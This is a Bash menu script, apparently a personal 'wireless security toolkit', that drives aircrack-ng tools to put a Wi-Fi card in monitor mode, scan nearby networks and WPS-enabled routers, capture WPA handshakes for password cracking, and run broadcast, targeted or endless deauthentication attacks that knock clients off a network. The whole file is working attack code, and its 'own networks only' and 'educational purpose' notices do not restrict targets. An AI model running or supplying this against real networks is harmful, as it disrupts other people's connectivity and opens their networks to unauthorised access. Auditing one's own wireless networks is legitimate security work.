#!/bin/bash

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

INTERFACE="wlan0"
MON_INTERFACE="wlan0mon"
OUTPUT_BASE="$HOME/lab_scans"
SCAN_TIME=30
OUTPUT_DIR="${OUTPUT_BASE}/$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT_DIR 2>/dev/null
DEAUTH_PID=""

check_monitor_mode_quiet() {
    iwconfig 2>/dev/null | grep -q "Mode:Monitor" && return 0 || return 1
}

check_monitor_mode() {
    if check_monitor_mode_quiet; then
        echo -e "${GREEN}[✓] Monitor mode is ACTIVE on $MON_INTERFACE${NC}"
        return 0
    else
        echo -e "${RED}[✗] Monitor mode is NOT ACTIVE${NC}"
        return 1
    fi
}

stop_deauth() {
    if [ ! -z "$DEAUTH_PID" ] && kill -0 $DEAUTH_PID 2>/dev/null; then
        echo -e "${YELLOW}[*] Stopping deauthentication attack...${NC}"
        kill $DEAUTH_PID 2>/dev/null
        DEAUTH_PID=""
        echo -e "${GREEN}[✓] Deauth attack stopped${NC}"
        sleep 1
    fi
}

header() {
    clear
    echo -e "${BLUE}"
  echo "╔══════════════════════════════════════════════════════════════╗"
  echo "║                     WIRELESS SECURITY Toolkit                ║"
  echo "║                       🐇 White Rabbit 🐰                     "
  echo "     👉 Visit me at: https://github.com/whiterabbit168          "
  echo "╚══════════════════════════════════════════════════════════════╝"


    echo -e "${NC}"
    echo -e "Interface: ${GREEN}$INTERFACE${NC}"
    echo -e "Monitor Mode: $(check_monitor_mode_quiet && echo -e "${GREEN}ACTIVE${NC}" || echo -e "${RED}INACTIVE${NC}")"
    echo -e "Output Dir: ${CYAN}$OUTPUT_DIR${NC}"
    echo -e "Time: ${YELLOW}$(date '+%H:%M:%S')${NC}"
    echo "════════════════════════════════════════════════════"
}

enable_monitor() {
    header
    echo -e "${BLUE}[ OPTION 1: ENABLE MONITOR MODE ]${NC}"
    echo ""
    
    if check_monitor_mode_quiet; then
        echo -e "${YELLOW}[!] Monitor mode is already enabled${NC}"
        echo -e "${CYAN}Current wireless interfaces:${NC}"
        iwconfig 2>/dev/null | grep -E "wlan|wlx|mon" | grep -v "no wireless"
        echo ""
        read -p "Press Enter to return to main menu..."
        return
    fi
    
    echo -e "${YELLOW}[*] Checking for interfering processes...${NC}"
    INTERFERING=$(sudo airmon-ng check 2>/dev/null | grep -E "(PID|NetworkManager|wpa_supplicant)" | wc -l)
    
    if [ $INTERFERING -gt 1 ]; then
        echo -e "${RED}[!] Found $((INTERFERING-1)) interfering process(es)${NC}"
        echo -e "${YELLOW}[*] Stopping interfering processes...${NC}"
        sudo airmon-ng check kill > /dev/null 2>&1
        echo -e "${GREEN}[✓] Interfering processes stopped${NC}"
    else
        echo -e "${GREEN}[✓] No interfering processes found${NC}"
    fi
    
    echo ""
    echo -e "${YELLOW}[*] Enabling monitor mode on $INTERFACE...${NC}"
    echo -ne "${YELLOW}["
    for i in {1..20}; do
        echo -ne "▰"
        sleep 0.05
    done
    echo -e "]${NC}"
    
    sudo airmon-ng start $INTERFACE > /dev/null 2>&1
    
    if check_monitor_mode_quiet; then
        echo -e "\n${GREEN}[✓] MONITOR MODE ENABLED SUCCESSFULLY!${NC}"
        echo -e "${CYAN}════════════════════════════════════════════════════${NC}"
        echo -e "${GREEN}Interface:${NC} $MON_INTERFACE"
        echo -e "${GREEN}Mode:${NC} Monitor"
        echo -e "${GREEN}Status:${NC} Ready for wireless reconnaissance"
        echo -e "${CYAN}════════════════════════════════════════════════════${NC}"
    else
        echo -e "\n${RED}[✗] FAILED TO ENABLE MONITOR MODE${NC}"
    fi
    
    echo ""
    read -p "Press Enter to return to main menu..."
}

disable_monitor_menu() {
    header
    echo -e "${BLUE}[ OPTION 7: DISABLE MONITOR MODE ]${NC}"
    echo ""
    
    stop_deauth
    
    if ! check_monitor_mode_quiet; then
        echo -e "${YELLOW}[!] Monitor mode is not currently enabled${NC}"
        read -p "Press Enter to return to main menu..."
        return
    fi
    
    echo -e "${YELLOW}[*] Disabling monitor mode...${NC}"
    echo -ne "${YELLOW}["
    for i in {1..20}; do
        echo -ne "▰"
        sleep 0.05
    done
    echo -e "]${NC}"
    
    sudo airmon-ng stop $MON_INTERFACE > /dev/null 2>&1
    sudo systemctl restart NetworkManager > /dev/null 2>&1
    sudo systemctl restart wpa_supplicant > /dev/null 2>&1
    
    echo -e "\n${GREEN}[✓] MONITOR MODE DISABLED${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}Network services restored${NC}"
    echo -e "${GREEN}Regular WiFi functionality enabled${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════${NC}"
    
    echo ""
    read -p "Press Enter to return to main menu..."
}

basic_scan() {
    header
    echo -e "${BLUE}[ OPTION 2: BASIC NETWORK DISCOVERY ]${NC}"
    echo ""
    
    if ! check_monitor_mode_quiet; then
        echo -e "${RED}[!] Monitor mode is required${NC}"
        echo -e "${YELLOW}Please run Option 1 first to enable monitor mode${NC}"
        echo ""
        read -p "Press Enter to return to main menu..."
        return
    fi
    
    echo -e "${YELLOW}[*] This will scan all channels for $SCAN_TIME seconds${NC}"
    echo ""
    read -p "Press Enter to start scanning..." -n 1
    
    echo -e "\n\n${YELLOW}[*] Starting basic network discovery...${NC}"
    
    sudo airodump-ng --band abg --write $OUTPUT_DIR/basic_scan --output-format csv,pcap $MON_INTERFACE &
    SCAN_PID=$!
    
    echo ""
    for i in $(seq 1 $SCAN_TIME); do
        PROGRESS=$((i * 100 / SCAN_TIME))
        BAR_LENGTH=$((i * 50 / SCAN_TIME))
        echo -ne "\r${CYAN}["
        for j in $(seq 1 $BAR_LENGTH); do echo -ne "█"; done
        for j in $(seq $BAR_LENGTH 49); do echo -ne "░"; done
        echo -ne "] ${PROGRESS}% - ${i}/${SCAN_TIME}s${NC}"
        sleep 1
    done
    
    kill $SCAN_PID 2>/dev/null
    wait $SCAN_PID 2>/dev/null
    
    echo -e "\n\n${GREEN}[✓] SCAN COMPLETED${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}Results saved to:${NC}"
    echo -e "  • ${YELLOW}$OUTPUT_DIR/basic_scan-01.csv${NC}"
    echo -e "  • ${YELLOW}$OUTPUT_DIR/basic_scan-01.cap${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════${NC}"
    
    if [ -f "$OUTPUT_DIR/basic_scan-01.csv" ]; then
        NETWORK_COUNT=$(grep -E '^([0-9A-F]{2}:){5}[0-9A-F]{2}' "$OUTPUT_DIR/basic_scan-01.csv" | wc -l)
        echo -e "${GREEN}Networks detected:${NC} $NETWORK_COUNT"
    fi
    
    echo ""
    read -p "Press Enter to return to main menu..."
}

targeted_scan() {
    header
    echo -e "${BLUE}[ OPTION 3: TARGETED AP SCAN ]${NC}"
    echo ""
    
    if ! check_monitor_mode_quiet; then
        echo -e "${RED}[!] Monitor mode is required${NC}"
        echo -e "${YELLOW}Please run Option 1 first to enable monitor mode${NC}"
        echo ""
        read -p "Press Enter to return to main menu..."
        return
    fi
    
    RECENT_SCAN=$(find $HOME/lab_scans -name "*basic_scan*.csv" -o -name "*target*.csv" 2>/dev/null | sort -r | head -1)
    
    if [ -f "$RECENT_SCAN" ]; then
        echo -e "${GREEN}Using scan file: $(basename $RECENT_SCAN)${NC}"
        echo ""
        grep -E '^([0-9A-F]{2}:){5}[0-9A-F]{2}' "$RECENT_SCAN" 2>/dev/null | head -10 | while IFS= read -r line; do
            BSSID=$(echo "$line" | cut -d',' -f1)
            CH=$(echo "$line" | cut -d',' -f4)
            RSSI=$(echo "$line" | cut -d',' -f9 | sed 's/ //g')
            SSID=$(echo "$line" | cut -d',' -f14 | cut -c1-20)
            echo -e "${YELLOW}$BSSID${NC} | CH:${GREEN}$CH${NC} | RSSI:${RED}$RSSI${NC} | ${CYAN}$SSID${NC}"
        done
    else
        echo -e "${YELLOW}[!] No previous scan found${NC}"
        echo ""
        read -p "Press Enter to return to main menu..."
        return
    fi
    
    echo ""
    echo -e "${CYAN}Enter target details:${NC}"
    read -p "Target BSSID (MAC address): " TARGET_BSSID
    read -p "Channel number: " TARGET_CHANNEL
    read -p "Scan duration (seconds, default 45): " DURATION
    DURATION=${DURATION:-45}
    
    CLEAN_BSSID=$(echo "$TARGET_BSSID" | tr ':' '_')
    
    echo -e "\n${YELLOW}[*] Starting targeted scan...${NC}"
    
    sudo airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID \
        --write $OUTPUT_DIR/target_${CLEAN_BSSID} \
        --output-format csv,pcap $MON_INTERFACE &
    TARGET_PID=$!
    
    for i in $(seq 1 $DURATION); do
        PROGRESS=$((i * 100 / DURATION))
        BAR_LENGTH=$((i * 50 / DURATION))
        echo -ne "\r${CYAN}["
        for j in $(seq 1 $BAR_LENGTH); do echo -ne "▓"; done
        for j in $(seq $BAR_LENGTH 49); do echo -ne "░"; done
        echo -ne "] ${PROGRESS}% - Monitoring target...${NC}"
        sleep 1
    done
    
    kill $TARGET_PID 2>/dev/null
    wait $TARGET_PID 2>/dev/null
    
    echo -e "\n\n${GREEN}[✓] TARGETED SCAN COMPLETED${NC}"
    echo -e "${CYAN}Files saved:${NC}"
    echo -e "  • ${YELLOW}$OUTPUT_DIR/target_${CLEAN_BSSID}-01.csv${NC}"
    echo -e "  • ${YELLOW}$OUTPUT_DIR/target_${CLEAN_BSSID}-01.cap${NC}"
    
    echo ""
    read -p "Press Enter to return to main menu..."
}

wps_scan() {
    header
    echo -e "${BLUE}[ OPTION 4: WPS DISCOVERY ]${NC}"
    echo ""
    
    if ! check_monitor_mode_quiet; then
        echo -e "${RED}[!] Monitor mode is required${NC}"
        echo -e "${YELLOW}Please run Option 1 first to enable monitor mode${NC}"
        echo ""
        read -p "Press Enter to return to main menu..."
        return
    fi
    
    echo -e "${YELLOW}[*] Scanning for WPS-enabled networks...${NC}"
    echo ""
    read -p "Press Enter to start WPS scan..." -n 1
    
    echo -e "\n\n${CYAN}Live WPS Scan Results:${NC}"
    echo "════════════════════════════════════════════════════"
    
    timeout 25 sudo wash -i $MON_INTERFACE -C 2>/dev/null | \
    while IFS= read -r line; do
        if [[ $line =~ ([0-9A-F:]{17}) ]]; then
            echo -e "${GREEN}$line${NC}"
        elif [[ $line =~ "BSSID" ]]; then
            echo -e "${YELLOW}$line${NC}"
        else
            echo "$line"
        fi
    done
    
    sudo wash -i $MON_INTERFACE -o $OUTPUT_DIR/wps_scan.csv > /dev/null 2>&1 &
    WASH_PID=$!
    sleep 25
    kill $WASH_PID 2>/dev/null
    
    echo -e "\n${GREEN}[✓] WPS SCAN COMPLETED${NC}"
    echo -e "${CYAN}Full results saved to: $OUTPUT_DIR/wps_scan.csv${NC}"
    
    echo ""
    read -p "Press Enter to return to main menu..."
}

handshake_capture() {
    header
    echo -e "${BLUE}[ OPTION 5: HANDSHAKE CAPTURE ]${NC}"
    echo ""
    
    if ! check_monitor_mode_quiet; then
        echo -e "${RED}[!] Monitor mode is required${NC}"
        echo -e "${YELLOW}Please run Option 1 first to enable monitor mode${NC}"
        echo ""
        read -p "Press Enter to return to main menu..."
        return
    fi
    
    RECENT_SCAN=$(find $HOME/lab_scans -name "*basic_scan*.csv" 2>/dev/null | sort -r | head -1)
    
    if [ -f "$RECENT_SCAN" ]; then
        echo -e "${GREEN}Recent networks detected:${NC}"
        echo "----------------------------------------"
        grep -E '^([0-9A-F]{2}:){5}[0-9A-F]{2}' "$RECENT_SCAN" 2>/dev/null | head -8 | nl
        echo ""
    fi
    
    read -p "Enter target BSSID: " TARGET_BSSID
    read -p "Enter channel: " TARGET_CHANNEL
    read -p "Capture filename (default: handshake): " CAP_FILE
    CAP_FILE=${CAP_FILE:-handshake}
    
    echo -e "\n${YELLOW}[*] READY TO CAPTURE HANDSHAKE${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}Target:${NC} $TARGET_BSSID"
    echo -e "${GREEN}Channel:${NC} $TARGET_CHANNEL"
    echo -e "${GREEN}Capture file:${NC} $CAP_FILE"
    echo -e "${CYAN}════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}[!] INSTRUCTIONS:${NC}"
    echo -e "1. This scan will run until you press Ctrl+C"
    echo -e "2. Use Option 9 to start deauth attack on target"
    echo -e "3. Wait for handshake capture"
    echo -e "4. Press Ctrl+C when done"
    echo ""
    read -p "Press Enter to start capture..." -n 1
    
    echo -e "\n\n${YELLOW}[*] Starting handshake capture...${NC}"
    
    sudo airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID \
        --write $OUTPUT_DIR/$CAP_FILE \
        --output-format pcap $MON_INTERFACE
    
    echo -e "\n${YELLOW}[*] Checking for handshake...${NC}"
    if aircrack-ng $OUTPUT_DIR/${CAP_FILE}-01.cap 2>/dev/null | grep -q "1 handshake"; then
        echo -e "${GREEN}[✓] SUCCESS! Handshake captured!${NC}"
    else
        echo -e "${RED}[✗] No handshake found in capture${NC}"
    fi
    
    echo ""
    read -p "Press Enter to return to main menu..."
}

deauth_attack() {
    header
    echo -e "${BLUE}[ OPTION 9: DEAUTHENTICATION ATTACK ]${NC}"
    echo ""
    
    if ! check_monitor_mode_quiet; then
        echo -e "${RED}[!] Monitor mode is required${NC}"
        echo -e "${YELLOW}Please run Option 1 first to enable monitor mode${NC}"
        echo ""
        read -p "Press Enter to return to main menu..."
        return
    fi
    
    if [ ! -z "$DEAUTH_PID" ] && kill -0 $DEAUTH_PID 2>/dev/null; then
        echo -e "${RED}[!] A deauth attack is already running${NC}"
        echo ""
        echo -e "${CYAN}Current deauth attack PID: $DEAUTH_PID${NC}"
        echo ""
        read -p "Do you want to stop it? (y/N): " STOP_CHOICE
        if [[ "$STOP_CHOICE" =~ ^[Yy]$ ]]; then
            stop_deauth
        fi
        read -p "Press Enter to return to main menu..."
        return
    fi
    
    echo -e "${YELLOW}[*] Deauthentication Attack Options:${NC}"
    echo "════════════════════════════════════════════════════"
    echo -e "${GREEN}1.${NC} Broadcast deauth (all clients)"
    echo -e "${GREEN}2.${NC} Targeted deauth (specific client)"
    echo -e "${GREEN}3.${NC} Continuous deauth"
    echo -e "${GREEN}4.${NC} Deauth with packet count"
    echo "════════════════════════════════════════════════════"
    
    read -p "Select attack type [1-4]: " ATTACK_TYPE
    
    case $ATTACK_TYPE in
        1|2|3|4)
            echo ""
            echo -e "${CYAN}Enter target details:${NC}"
            read -p "Target AP BSSID (MAC address): " TARGET_BSSID
            
            if [ "$ATTACK_TYPE" = "2" ]; then
                read -p "Target Client MAC (leave empty for broadcast): " TARGET_CLIENT
            fi
            
            if [ "$ATTACK_TYPE" = "4" ]; then
                read -p "Number of deauth packets (default 10): " PACKET_COUNT
                PACKET_COUNT=${PACKET_COUNT:-10}
            else
                read -p "Attack duration in seconds (0 for infinite): " ATTACK_DURATION
                ATTACK_DURATION=${ATTACK_DURATION:-0}
            fi
            
            echo -e "\n${RED}[!] WARNING:${NC} Deauthentication attacks:"
            echo -e "  • Should only be used on YOUR OWN networks"
            echo -e "  • May disrupt network connectivity"
            echo -e "  • Can be detected by network monitoring"
            echo ""
            read -p "Type 'CONFIRM' to start attack: " CONFIRM
            
            if [ "$CONFIRM" != "CONFIRM" ]; then
                echo -e "${YELLOW}[*] Attack cancelled${NC}"
                read -p "Press Enter to return to main menu..."
                return
            fi
            
            echo -e "\n${YELLOW}[*] Starting deauthentication attack...${NC}"
            
            case $ATTACK_TYPE in
                1)
                    CMD="sudo aireplay-ng --deauth 0 -a $TARGET_BSSID $MON_INTERFACE"
                    ;;
                2)
                    if [ -z "$TARGET_CLIENT" ]; then
                        CMD="sudo aireplay-ng --deauth 0 -a $TARGET_BSSID $MON_INTERFACE"
                    else
                        CMD="sudo aireplay-ng --deauth 0 -a $TARGET_BSSID -c $TARGET_CLIENT $MON_INTERFACE"
                    fi
                    ;;
                3)
                    CMD="sudo aireplay-ng --deauth 0 -a $TARGET_BSSID $MON_INTERFACE"
                    ;;
                4)
                    CMD="sudo aireplay-ng --deauth $PACKET_COUNT -a $TARGET_BSSID $MON_INTERFACE"
                    ;;
            esac
            
            echo -e "${CYAN}Command:${NC} $CMD"
            echo ""
            
            eval "$CMD" &
            DEAUTH_PID=$!
            
            if [ "$ATTACK_DURATION" -gt 0 ] && [ "$ATTACK_TYPE" != "4" ]; then
                echo -e "${YELLOW}[*] Attack will run for $ATTACK_DURATION seconds${NC}"
                sleep $ATTACK_DURATION
                stop_deauth
                echo -e "${GREEN}[✓] Deauth attack completed${NC}"
            elif [ "$ATTACK_TYPE" = "4" ]; then
                echo -e "${YELLOW}[*] Sending $PACKET_COUNT deauth packets...${NC}"
                sleep 3
                echo -e "${GREEN}[✓] Deauth packets sent${NC}"
                DEAUTH_PID=""
            else
                echo -e "${RED}[!] Continuous deauth attack running${NC}"
                echo -e "${YELLOW}[!] Use Option 9 again to stop it${NC}"
            fi
            ;;
        *)
            echo -e "${RED}[!] Invalid selection${NC}"
            ;;
    esac
    
    echo ""
    read -p "Press Enter to return to main menu..."
}

show_results() {
    header
    echo -e "${BLUE}[ OPTION 6: VIEW SCAN RESULTS ]${NC}"
    echo ""
    
    if [ ! -d "$OUTPUT_BASE" ]; then
        echo -e "${YELLOW}[!] No scan directory found${NC}"
        echo ""
        read -p "Press Enter to return to main menu..."
        return
    fi
    
    SCAN_DIRS=$(find $HOME/lab_scans -type d -name "2*" 2>/dev/null | sort -r)
    
    if [ -z "$SCAN_DIRS" ]; then
        echo -e "${YELLOW}[!] No scan results found${NC}"
        echo ""
        read -p "Press Enter to return to main menu..."
        return
    fi
    
    echo -e "${GREEN}Available scan sessions:${NC}"
    echo "════════════════════════════════════════════════════"
    
    COUNT=1
    for dir in $SCAN_DIRS; do
        FILES_COUNT=$(find "$dir" -type f \( -name "*.csv" -o -name "*.cap" \) 2>/dev/null | wc -l)
        DATE=$(basename "$dir" | sed 's/_/ /')
        echo -e "${COUNT}. ${CYAN}$DATE${NC} - ${YELLOW}$FILES_COUNT files${NC}"
        COUNT=$((COUNT + 1))
    done
    
    echo ""
    read -p "Select session number (or 0 for main menu): " SESSION_NUM
    
    if [ "$SESSION_NUM" -eq 0 ]; then
        return
    fi
    
    SELECTED_DIR=$(echo "$SCAN_DIRS" | sed -n "${SESSION_NUM}p")
    
    if [ -z "$SELECTED_DIR" ]; then
        echo -e "${RED}[!] Invalid selection${NC}"
        sleep 1
        return
    fi
    
    while true; do
        header
        echo -e "${BLUE}[ VIEWING: $(basename $SELECTED_DIR) ]${NC}"
        echo ""
        
        FILES=$(find "$SELECTED_DIR" -type f \( -name "*.csv" -o -name "*.cap" \) 2>/dev/null | sort)
        
        if [ -z "$FILES" ]; then
            echo -e "${YELLOW}[!] No files in this directory${NC}"
            read -p "Press Enter to go back..."
            return
        fi
        
        echo -e "${GREEN}Files in this session:${NC}"
        echo "════════════════════════════════════════════════════"
        
        COUNT=1
        for file in $FILES; do
            FILENAME=$(basename "$file")
            SIZE=$(du -h "$file" | cut -f1)
            echo -e "${COUNT}. ${CYAN}$FILENAME${NC} (${YELLOW}$SIZE${NC})"
            COUNT=$((COUNT + 1))
        done
        
        echo ""
        echo -e "${CYAN}Commands:${NC}"
        echo -e "  ${GREEN}number${NC} - View file"
        echo -e "  ${GREEN}b${NC}      - Back to session list"
        echo -e "  ${GREEN}m${NC}      - Main menu"
        echo ""
        read -p "Select: " CHOICE
        
        case $CHOICE in
            [0-9]*)
                if [ "$CHOICE" -ge 1 ] && [ "$CHOICE" -le $((COUNT-1)) ]; then
                    FILE_TO_VIEW=$(echo "$FILES" | sed -n "${CHOICE}p")
                    clear
                    echo -e "${BLUE}[ VIEWING: $(basename "$FILE_TO_VIEW") ]${NC}"
                    echo -e "${CYAN}Path: $FILE_TO_VIEW${NC}"
                    echo "════════════════════════════════════════════════════"
                    
                    if [[ "$FILE_TO_VIEW" == *.csv ]]; then
                        echo -e "\n${GREEN}First 20 lines:${NC}\n"
                        head -20 "$FILE_TO_VIEW" | column -t -s, | head -20
                        echo -e "\n${YELLOW}Total lines: $(wc -l < "$FILE_TO_VIEW")${NC}"
                    elif [[ "$FILE_TO_VIEW" == *.cap ]]; then
                        echo -e "\n${GREEN}Capture file information:${NC}\n"
                        aircrack-ng "$FILE_TO_VIEW" 2>/dev/null | head -15
                    fi
                    
                    echo -e "\n════════════════════════════════════════════════════"
                    read -p "Press Enter to continue..."
                fi
                ;;
            b|B)
                break
                ;;
            m|M)
                return
                ;;
            *)
                echo -e "${RED}[!] Invalid choice${NC}"
                sleep 1
                ;;
        esac
    done
}

cleanup_exit() {
    header
    echo -e "${BLUE}[ EXITING PROGRAM ]${NC}"
    echo ""
    
    stop_deauth
    
    if check_monitor_mode_quiet; then
        echo -e "${YELLOW}[*] Disabling monitor mode...${NC}"
        sudo airmon-ng stop $MON_INTERFACE > /dev/null 2>&1
        sudo systemctl restart NetworkManager > /dev/null 2>&1
        sudo systemctl restart wpa_supplicant > /dev/null 2>&1
        echo -e "${GREEN}[✓] Monitor mode disabled${NC}"
    fi
    
    echo -e "\n${CYAN}════════════════════════════════════════════════════${NC}"
    echo -e "${GREEN}[✓] SCRIPT COMPLETED${NC}"
    echo -e "${CYAN}Scan files saved to: $HOME/lab_scans/${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════${NC}"
    echo -e "${YELLOW}Thank you for using this Tool!${NC}"

    echo -e "${YELLOW}Please use it for Educational Purpose only."
    echo ""
    exit 0
}

while true; do
    header
    echo -e "${BLUE}MAIN MENU${NC}"
    echo "════════════════════════════════════════════════════"
    echo -e "${GREEN}1.${NC} Enable Monitor Mode"
    echo -e "${GREEN}2.${NC} Basic Network Discovery"
    echo -e "${GREEN}3.${NC} Targeted AP Scan"
    echo -e "${GREEN}4.${NC} WPS Discovery"
    echo -e "${GREEN}5.${NC} Handshake Capture"
    echo -e "${GREEN}6.${NC} View Scan Results"
    echo -e "${GREEN}7.${NC} Disable Monitor Mode"
    echo -e "${RED}8.${NC} Stop Deauth Attack"
    echo -e "${RED}9.${NC} Deauthentication Attack"
    echo -e "${RED}0.${NC} Exit Program"
    echo "════════════════════════════════════════════════════"
    echo -e "${CYAN}Monitor Mode:${NC} $(check_monitor_mode_quiet && echo -e "${GREEN}✓ ACTIVE${NC}" || echo -e "${RED}✗ INACTIVE${NC}")"
    echo -e "${CYAN}Deauth Attack:${NC} $([ ! -z "$DEAUTH_PID" ] && kill -0 $DEAUTH_PID 2>/dev/null && echo -e "${RED}⚠ RUNNING${NC}" || echo -e "${GREEN}✓ STOPPED${NC}")"
    echo "════════════════════════════════════════════════════"
    
    read -p "Select option [0-9]: " CHOICE
    
    case $CHOICE in
        1) enable_monitor ;;
        2) basic_scan ;;
        3) targeted_scan ;;
        4) wps_scan ;;
        5) handshake_capture ;;
        6) show_results ;;
        7) disable_monitor_menu ;;
        8) stop_deauth ;;
        9) deauth_attack ;;
        0) cleanup_exit ;;
        *) 
            echo -e "${RED}[!] Invalid option${NC}"
            sleep 1
            ;;
    esac
done
